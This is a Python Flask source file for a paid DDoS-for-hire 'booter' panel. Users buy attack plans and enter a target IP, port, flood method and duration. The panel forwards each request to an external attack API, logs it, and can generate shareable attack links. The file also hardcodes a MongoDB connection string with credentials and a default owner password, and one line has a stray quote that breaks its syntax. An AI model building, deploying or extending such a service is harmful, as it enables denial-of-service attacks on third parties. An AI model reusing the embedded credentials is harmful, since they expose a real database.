import os
import time
import hashlib
import threading
import requests
from datetime import datetime
from flask import Flask, request, jsonify, session, redirect
import pymongo
from bson.objectid import ObjectId

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "primexarmy_secret_key_2024")

# ========== ENVIRONMENT VARIABLES ==========
MONGO_URL = os.getenv("MONGO_URL", "mongodb+srv://Soul:Soul9086@soul.e9ugjn8.mongodb.net/test?retryWrites=true&w=majority"")
PORT = int(os.getenv("PORT", 8080))
OWNER_USERNAME = os.getenv("OWNER_USERNAME", "soul")
OWNER_PASSWORD = os.getenv("OWNER_PASSWORD", "soul9086")
SITE_NAME = os.getenv("SITE_NAME", "SOULARMY")
SITE_URL = os.getenv("SITE_URL", "https://kkkkkkkkkk22222-production.up.railway.app")
CLOUDFLARE_API = os.getenv("CLOUDFLARE_API", "")
USE_CLOUDFLARE_API = os.getenv("USE_CLOUDFLARE_API", "true").lower() == "true"

# ========== PANEL MODE ==========
PANEL_MODE = os.getenv("PANEL_MODE", "PREMIUM").upper()

PANEL_CONFIGS = {
    "ATTACK": {"name": "⚡ ATTACK HUB", "icon": "🎯", "btn": "LAUNCH ATTACK", "color": "#ef4444"},
    "STRESS": {"name": "💥 STRESS TESTER", "icon": "💥", "btn": "START STRESS", "color": "#f59e0b"},
    "DDOS": {"name": "🔥 DDOS HUB", "icon": "🔥", "btn": "INITIATE DDOS", "color": "#dc2626"},
    "BOOTER": {"name": "💀 BOOTER HUB", "icon": "💀", "btn": "BOOT NOW", "color": "#8b5cf6"},
    "PREMIUM": {"name": "👑 PREMIUM HUB", "icon": "👑", "btn": "EXECUTE", "color": "#ec4899"}
}
CURRENT = PANEL_CONFIGS.get(PANEL_MODE, PANEL_CONFIGS["PREMIUM"])

# ========== MONGODB ==========
mongo_client = None
db = None
users_col = None
attacks_col = None
mongo_connected = False

if MONGO_URL:
    try:
        mongo_client = pymongo.MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
        mongo_client.admin.command('ping')
        db = mongo_client['primexarmy']
        users_col = db['users']
        attacks_col = db['attacks']
        mongo_connected = True
        print(f"✅ MongoDB | Mode: {PANEL_MODE}")
    except Exception as e:
        print(f"⚠️ MongoDB error: {e}")

PLANS = {
    "free": {"name": "FREE", "daily_limit": 999, "max_duration": 9999},
    "basic": {"name": "BASIC", "daily_limit": 20, "max_duration": 180},
    "premium": {"name": "PREMIUM", "daily_limit": 100, "max_duration": 600},
    "vip": {"name": "👑 VIP", "daily_limit": 500, "max_duration": 3600}
}

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def get_user():
    if 'user_id' in session:
        if session.get('is_owner'):
            return {"username": OWNER_USERNAME, "is_owner": True, "plan": "vip", "_id": "owner"}
        if mongo_connected and users_col:
            try:
                return users_col.find_one({"_id": ObjectId(session['user_id'])})
            except:
                return None
    return None

# ========== CLOUDFLARE API ==========
@app.route('/cloudflare-status')
def cloudflare_status():
    try:
        r = requests.get(f"{CLOUDFLARE_API}/api/status", timeout=10)
        return jsonify(r.json())
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ========== ATTACK HUB LINK ==========
@app.route(f'/hub/<user_id>/<target>/<port>/<duration>')
def attack_hub_link(user_id, target, port, duration):
    try:
        is_owner = (user_id == "owner")
        if not is_owner and mongo_connected and users_col:
            user = users_col.find_one({"_id": ObjectId(user_id)})
            if not user:
                return "<h2>❌ Invalid User!</h2>", 400
            plan = PLANS.get(user.get('plan', 'free'), PLANS['free'])
        else:
            plan = PLANS['vip']
        
        try:
            port = int(port)
            duration = int(duration)
            max_dur = 300 if is_owner else plan['max_duration']
            if duration < 10 or duration > max_dur:
                return f"<h2>❌ Duration 10-{max_dur}s</h2>", 400
        except:
            return "<h2>❌ Invalid params</h2>", 400
        
        if USE_CLOUDFLARE_API:
            try:
                requests.post(f"{CLOUDFLARE_API}/api/attack", json={"ip": target, "port": port, "duration": duration, "user_id": user_id}, timeout=10)
            except:
                pass
        
        if mongo_connected and attacks_col:
            attacks_col.insert_one({
                "user_id": user_id, "target": target, "port": port,
                "method": "HUB", "duration": duration, "status": "completed",
                "date": datetime.now().strftime('%Y-%m-%d'), "created_at": time.time()
            })
        
        return f'''
        <!DOCTYPE html>
        <html>
        <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Attack Launched</title>
        <style>
            body{{font-family:Arial;background:linear-gradient(135deg,#0a0a0f,#1a1a2e);color:white;min-height:100vh;display:flex;justify-content:center;align-items:center;}}
            .container{{text-align:center;padding:40px;background:rgba(255,255,255,0.05);border-radius:30px;border:1px solid rgba(168,85,247,0.3);}}
            h1{{background:linear-gradient(135deg,#a855f7,#ff6b35);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}}
            .btn{{background:linear-gradient(135deg,#a855f7,#7c3aed);padding:12px30px;border-radius:50px;color:white;text-decoration:none;display:inline-block;margin-top:20px;}}
        </style>
        </head>
        <body>
        <div class="container">
            <h1>{CURRENT['icon']} {CURRENT['name']}</h1>
            <p>🎯 {target}:{port}<br>⏱️ {duration}s</p>
            <p>✅ Attack Completed!</p>
            <a href="/dashboard" class="btn">Go to Dashboard</a>
        </div>
        </body>
        </html>
        '''
    except Exception as e:
        return f"<h2>Error: {e}</h2>", 500

@app.route('/generate-hub')
def generate_hub_page():
    user = get_user()
    if not user:
        return redirect('/login')
    user_id = user['_id'] if not user.get('is_owner') else "owner"
    return f'''
    <!DOCTYPE html>
    <html>
    <head><title>Generate Link - {SITE_NAME}</title>
    <style>
        body{{background:linear-gradient(135deg,#0a0a0f,#1a1a2e);color:white;font-family:Arial;padding:20px;}}
        .container{{max-width:500px;margin:50px auto;background:rgba(255,255,255,0.05);border-radius:20px;padding:30px;}}
        input,button{{width:100%;padding:12px;margin:10px 0;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:white;}}
        button{{background:{CURRENT['color']};cursor:pointer;font-weight:bold;}}
        .result{{margin-top:20px;display:none;}}
        a{{color:#a855f7;}}
    </style>
    </head>
    <body>
    <div class="container">
        <h2>{CURRENT['icon']} Generate {CURRENT['name']} Link</h2>
        <input type="text" id="target" placeholder="Target IP">
        <input type="number" id="port" placeholder="Port">
        <input type="number" id="duration" placeholder="Duration (10-300s)">
        <button onclick="generate()">Generate Link</button>
        <div class="result" id="result"><input type="text" id="link" readonly><button onclick="copy()">Copy URL</button></div>
        <a href="/dashboard">← Back</a>
    </div>
    <script>
        const uid = "{user_id}";
        const base = "{SITE_URL}";
        function generate() {{
            let t=document.getElementById('target').value, p=document.getElementById('port').value, d=document.getElementById('duration').value;
            if(!t||!p||!d){{alert('Fill all fields');return;}}
            let url=`${{base}}/hub/${{uid}}/${{t}}/${{p}}/${{d}}`;
            document.getElementById('link').value=url;
            document.getElementById('result').style.display='block';
        }}
        function copy(){{document.getElementById('link').select();document.execCommand('copy');alert('Copied!');}}
    </script>
    </body>
    </html>
    '''

# ========== DASHBOARD ==========
@app.route('/')
def index():
    user = get_user()
    return f'''
    <!DOCTYPE html>
    <html>
    <head><title>{SITE_NAME}</title>
    <style>
        body{{background:linear-gradient(135deg,#0a0a0f,#1a1a2e);color:white;font-family:Arial;}}
        .navbar{{background:rgba(10,10,15,0.8);padding:18px40px;display:flex;justify-content:space-between;}}
        .logo{{font-size:28px;font-weight:800;background:linear-gradient(135deg,#a855f7,#ff6b35);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}}
        .hero{{text-align:center;padding:100px20px;}}
        h1{{font-size:64px;background:linear-gradient(135deg,#fff,#a855f7,#ff6b35);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}}
        .btn{{background:linear-gradient(135deg,#a855f7,#7c3aed);padding:14px35px;border-radius:50px;color:white;text-decoration:none;display:inline-block;margin:10px;}}
    </style>
    </head>
    <body>
        <div class="navbar"><div class="logo">🔥 {SITE_NAME}</div>
        <div>{f'<a href="/dashboard" style="color:white;">Dashboard</a><a href="/logout" style="color:white;margin-left:20px;">Logout</a>' if user else '<a href="/login" style="color:white;">Login</a><a href="/register" style="color:white;margin-left:20px;">Register</a>'}</div></div>
        <div class="hero"><h1>{CURRENT['icon']} {SITE_NAME}</h1><p>{CURRENT['name']}</p>
        <a href="/register" class="btn">Get Started</a><a href="/login" class="btn">Login</a></div>
    </body>
    </html>
    '''

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == OWNER_USERNAME and password == OWNER_PASSWORD:
            session['user_id'] = "owner"
            session['is_owner'] = True
            return '<script>alert("Welcome Owner!");location.href="/dashboard"</script>'
        if mongo_connected and users_col:
            user = users_col.find_one({"username": username})
            if user and user.get('password') == hash_password(password):
                session['user_id'] = str(user['_id'])
                return '<script>alert("Login successful!");location.href="/dashboard"</script>'
        return '<script>alert("Invalid credentials!");location.href="/login"</script>'
    return f'''
    <!DOCTYPE html>
    <html>
    <head><title>Login</title>
    <style>
        body{{background:linear-gradient(135deg,#0a0a0f,#1a1a2e);color:white;font-family:Arial;min-height:100vh;display:flex;justify-content:center;align-items:center;}}
        .card{{background:rgba(255,255,255,0.05);padding:40px;border-radius:20px;width:350px;text-align:center;}}
        input{{width:100%;padding:12px;margin:10px0;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:white;}}
        button{{width:100%;padding:12px;background:{CURRENT['color']};border:none;border-radius:8px;color:white;cursor:pointer;}}
        a{{color:#a855f7;}}
    </style>
    </head>
    <body>
    <div class="card"><h2>{CURRENT['icon']} Login</h2>
    <form method="POST"><input name="username" placeholder="Username"><input name="password" type="password" placeholder="Password"><button>Login</button></form>
    <p>New user? <a href="/register">Register</a></p></div>
    </body>
    </html>
    '''

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if not mongo_connected or not users_col:
            return '<script>alert("DB error");location.href="/register"</script>'
        if users_col.find_one({"username": username}):
            return '<script>alert("Username exists");location.href="/register"</script>'
        user_data = {"username": username, "password": hash_password(password), "plan": "free", "expiry": time.time() + 7*86400, "created_at": time.time()}
        result = users_col.insert_one(user_data)
        session['user_id'] = str(result.inserted_id)
        return '<script>alert("Registration successful! 7 days free trial.");location.href="/dashboard"</script>'
    return f'''
    <!DOCTYPE html>
    <html>
    <head><title>Register</title>
    <style>
        body{{background:linear-gradient(135deg,#0a0a0f,#1a1a2e);color:white;font-family:Arial;min-height:100vh;display:flex;justify-content:center;align-items:center;}}
        .card{{background:rgba(255,255,255,0.05);padding:40px;border-radius:20px;width:350px;text-align:center;}}
        input{{width:100%;padding:12px;margin:10px0;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:white;}}
        button{{width:100%;padding:12px;background:{CURRENT['color']};border:none;border-radius:8px;color:white;cursor:pointer;}}
        a{{color:#a855f7;}}
    </style>
    </head>
    <body>
    <div class="card"><h2>{CURRENT['icon']} Register</h2><p>7 days free trial</p>
    <form method="POST"><input name="username" placeholder="Username"><input name="password" type="password" placeholder="Password"><button>Register</button></form>
    <p>Have account? <a href="/login">Login</a></p></div>
    </body>
    </html>
    '''

@app.route('/dashboard')
def dashboard():
    user = get_user()
    if not user:
        return redirect('/login')
    is_owner = user.get('is_owner', False)
    if is_owner:
        plan = PLANS['vip'].copy()
        plan['max_duration'] = 300
        plan['name'] = '👑 OWNER'
        days_left = 365
    else:
        plan = PLANS.get(user.get('plan', 'free'), PLANS['free'])
        days_left = max(0, int((user.get('expiry', 0) - time.time())/86400))
    today = datetime.now().strftime('%Y-%m-%d')
    if mongo_connected and attacks_col:
        if is_owner:
            today_attacks = attacks_col.count_documents({"date": today})
            total_attacks = attacks_col.count_documents({})
        else:
            today_attacks = attacks_col.count_documents({"user_id": str(user['_id']), "date": today})
            total_attacks = attacks_col.count_documents({"user_id": str(user['_id'])})
    else:
        today_attacks = total_attacks = 0
    methods_html = "".join([f'<option value="{m}">{m}</option>' for m in ["UDP", "TCP", "HTTP", "SYN", "ICMP"]])
    admin_link = '<a href="/admin" class="nav-item">👑 Admin</a>' if is_owner else ''
    return f'''
    <!DOCTYPE html>
    <html>
    <head><title>Dashboard - {SITE_NAME}</title>
    <style>
        *{{margin:0;padding:0;box-sizing:border-box;}}
        body{{font-family:Inter,sans-serif;background:linear-gradient(135deg,#0a0a0f,#1a1a2e);color:#fff;}}
        .navbar{{background:rgba(10,10,15,0.8);padding:18px40px;display:flex;justify-content:space-between;border-bottom:1px solid rgba(168,85,247,0.2);}}
        .logo{{font-size:28px;font-weight:800;background:linear-gradient(135deg,#a855f7,#ff6b35);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}}
        .sidebar{{position:fixed;left:0;top:70px;width:240px;height:100%;background:rgba(10,10,15,0.9);padding:30px20px;}}
        .nav-item{{display:block;padding:12px15px;margin:5px0;border-radius:12px;color:#fff;text-decoration:none;}}
        .nav-item:hover,.nav-item.active{{background:rgba(168,85,247,0.2);color:#a855f7;}}
        .main{{margin-left:240px;padding:30px;}}
        .stats{{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;margin-bottom:30px;}}
        .stat-card{{background:rgba(255,255,255,0.05);border-radius:20px;padding:25px;text-align:center;}}
        .stat-number{{font-size:36px;font-weight:800;background:linear-gradient(135deg,#a855f7,#ff6b35);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}}
        .attack-card{{background:rgba(255,255,255,0.05);border-radius:24px;padding:30px;margin-bottom:30px;}}
        .form-group{{margin-bottom:20px;}}
        .form-group label{{display:block;margin-bottom:8px;color:#a0a0a0;}}
        .form-group input,.form-group select{{width:100%;padding:14px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:12px;color:#fff;}}
        .launch-btn,.hub-btn{{background:{CURRENT['color']};color:white;border:none;padding:16px;border-radius:12px;font-weight:700;cursor:pointer;width:100%;margin-bottom:15px;}}
        .hub-btn{{background:linear-gradient(135deg,#10b981,#059669);}}
        table{{width:100%;border-collapse:collapse;}}
        th,td{{padding:15px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.1);}}
        th{{color:#a855f7;}}
    </style>
    </head>
    <body>
        <div class="navbar"><div class="logo">🔥 {SITE_NAME}</div><div><a href="/logout" style="color:#fff;">Logout</a></div></div>
        <div class="sidebar"><a href="/dashboard" class="nav-item active">📊 Dashboard</a><a href="/generate-hub" class="nav-item">{CURRENT['icon']} {CURRENT['name']}</a><a href="/history" class="nav-item">📜 History</a>{admin_link}<a href="/logout" class="nav-item">🚪 Logout</a></div>
        <div class="main">
            <h2>Welcome, {user['username']}!</h2>
            <p>Plan: {plan['name']} | Days: {days_left} | Max: {plan['max_duration']}s</p>
            <div class="stats">
                <div class="stat-card"><h3>Today</h3><div class="stat-number">{today_attacks}</div><small>Limit: {plan['daily_limit']}</small></div>
                <div class="stat-card"><h3>Total</h3><div class="stat-number">{total_attacks}</div></div>
                <div class="stat-card"><h3>Max Duration</h3><div class="stat-number">{plan['max_duration']}s</div></div>
            </div>
            <div class="attack-card">
                <h3>{CURRENT['icon']} {CURRENT['name']}</h3>
                <form id="attackForm">
                    <div class="form-group"><label>Target IP</label><input type="text" id="target" placeholder="1.1.1.1" required></div>
                    <div class="form-group"><label>Port</label><input type="number" id="port" placeholder="80" required></div>
                    <div class="form-group"><label>Method</label><select id="method">{methods_html}</select></div>
                    <div class="form-group"><label>Duration</label><input type="number" id="duration" min="10" max="{plan['max_duration']}" value="60" required></div>
                    <button type="submit" class="launch-btn">{CURRENT['icon']} {CURRENT['btn']}</button>
                </form>
                <a href="/generate-hub"><button class="hub-btn">🔗 Generate {CURRENT['name']} Link</button></a>
            </div>
        </div>
        <script>
        document.getElementById('attackForm').onsubmit=async function(e){{
            e.preventDefault();
            let res=await fetch('/launch-attack',{{method:'POST',headers:{{'Content-Type':'application/x-www-form-urlencoded'}},body:`target=${{document.getElementById('target').value}}&port=${{document.getElementById('port').value}}&method=${{document.getElementById('method').value}}&duration=${{document.getElementById('duration').value}}`}});
            let data=await res.json();
            if(data.success) alert('✅ Attack launched!');
            else alert('❌ '+data.error);
        }};
        </script>
    </body>
    </html>
    '''

@app.route('/launch-attack', methods=['POST'])
def launch_attack():
    user = get_user()
    if not user:
        return jsonify({"success": False, "error": "Please login"})
    is_owner = user.get('is_owner', False)
    max_duration = 300 if is_owner else PLANS.get(user.get('plan', 'free'), PLANS['free'])['max_duration']
    target = request.form.get('target')
    port = request.form.get('port')
    method = request.form.get('method')
    duration = request.form.get('duration')
    try:
        duration = int(duration)
        if duration < 10 or duration > max_duration:
            return jsonify({"success": False, "error": f"Duration 10-{max_duration}s"})
        port = int(port)
        if port < 1 or port > 65535:
            return jsonify({"success": False, "error": "Invalid port"})
    except:
        return jsonify({"success": False, "error": "Invalid input"})
    if USE_CLOUDFLARE_API:
        try:
            requests.post(f"{CLOUDFLARE_API}/api/attack", json={"ip": target, "port": port, "duration": duration, "user_id": str(user['_id'])}, timeout=10)
        except:
            pass
    if mongo_connected and attacks_col:
        attacks_col.insert_one({"user_id": str(user['_id']), "username": user['username'], "target": target, "port": port, "method": method, "duration": duration, "status": "completed", "date": datetime.now().strftime('%Y-%m-%d'), "created_at": time.time()})
    return jsonify({"success": True})

@app.route('/history')
def history():
    user = get_user()
    if not user:
        return redirect('/login')
    is_owner = user.get('is_owner', False)
    attacks_html = ""
    if mongo_connected and attacks_col:
        query = {} if is_owner else {"user_id": str(user['_id'])}
        for a in attacks_col.find(query).sort("created_at", -1).limit(50):
            attacks_html += f"<tr><td>{a.get('target','N/A')}</td><td>{a.get('port','N/A')}</td><td>{a.get('method','N/A')}</td><td>{a.get('duration','N/A')}s</td><td>{a.get('status','N/A')}</td><td>{datetime.fromtimestamp(a.get('created_at',time.time())).strftime('%Y-%m-%d %H:%M:%S')}</td></tr>"
    return f'''
    <!DOCTYPE html>
    <html>
    <head><title>History</title>
    <style>body{{background:#0a0a0f;color:white;font-family:Arial;padding:20px;}} table{{width:100%;border-collapse:collapse;}} th,td{{padding:12px;border-bottom:1px solid #333;}}</style>
    </head>
    <body><a href="/dashboard">← Back</a><h2>Attack History</h2>
    <table><tr><th>Target</th><th>Port</th><th>Method</th><th>Duration</th><th>Status</th><th>Date</th></tr>{attacks_html if attacks_html else '<tr><td colspan="6">No attacks</td></tr>'}</table>
    </body>
    </html>
    '''

@app.route('/pricing')
def pricing():
    user = get_user()
    plans_html = ""
    for key, plan in PLANS.items():
        price = 0 if key == 'free' else 10 if key == 'basic' else 25 if key == 'premium' else 50
        plans_html += f'<div style="background:rgba(255,255,255,0.05);padding:25px;margin:15px;display:inline-block;width:200px;border-radius:15px;text-align:center;"><h3>{plan["name"]}</h3><p style="font-size:28px;color:#a855f7;">${price}</p><p>/month</p><p>✅ {plan["daily_limit"]} attacks/day</p><p>✅ {plan["max_duration"]}s max</p></div>'
    return f'''
    <!DOCTYPE html>
    <html>
    <head><title>Pricing</title>
    <style>
        body{{background:linear-gradient(135deg,#0a0a0f,#1a1a2e);color:white;text-align:center;padding:50px;}}
        .navbar{{background:rgba(10,10,15,0.95);padding:15px40px;display:flex;justify-content:space-between;position:fixed;top:0;left:0;right:0;}}
        .logo{{font-size:24px;font-weight:bold;color:#a855f7;}}
        .container{{margin-top:100px;}}
        .plans{{display:flex;justify-content:center;flex-wrap:wrap;}}
    </style>
    </head>
    <body>
        <div class="navbar"><div class="logo">🔥 {SITE_NAME}</div>
        <div>{f'<a href="/dashboard" style="color:white;">Dashboard</a><a href="/logout" style="color:white;margin-left:20px;">Logout</a>' if user else '<a href="/login" style="color:white;">Login</a><a href="/register" style="color:white;margin-left:20px;">Register</a>'}</div></div>
        <div class="container"><h1>Choose Your Plan</h1><div class="plans">{plans_html}</div></div>
    </body>
    </html>
    '''

@app.route('/admin')
def admin_panel():
    user = get_user()
    if not user or not user.get('is_owner'):
        return '<script>alert("Access Denied");location.href="/dashboard"</script>'
    users_html = ""
    if mongo_connected and users_col:
        for u in users_col.find().sort("created_at", -1):
            users_html += f"<tr><td>{u.get('username')}</td><td>{u.get('plan','free')}</td><td><select onchange=\"fetch('/admin/upgrade-user',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{user_id:'{u['_id']}',plan:this.value}})}})\"><option value='free'>FREE</option><option value='basic'>BASIC</option><option value='premium'>PREMIUM</option><option value='vip'>VIP</option></select></td></tr>"
    return f'<h2>Admin Panel</h2><table><tr><th>User</th><th>Plan</th><th>Upgrade</th></tr>{users_html}</table><a href="/dashboard">Back</a>'

@app.route('/admin/upgrade-user', methods=['POST'])
def admin_upgrade_user():
    user = get_user()
    if not user or not user.get('is_owner'):
        return jsonify({"success": False})
    data = request.get_json()
    if mongo_connected and users_col:
        users_col.update_one({"_id": ObjectId(data['user_id'])}, {"$set": {"plan": data['plan'], "expiry": time.time() + 86400*30}})
        return jsonify({"success": True})
    return jsonify({"success": False})

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "mode": PANEL_MODE, "panel": CURRENT['name']})

if __name__ == "__main__":
    print("=" * 50)
    print(f"🔥 {SITE_NAME} Panel Ready!")
    print(f"📌 Panel: {CURRENT['name']}")
    print(f"🌐 URL: {SITE_URL}")
    print("=" * 50)
    app.run(host='0.0.0.0', port=PORT, debug=False)
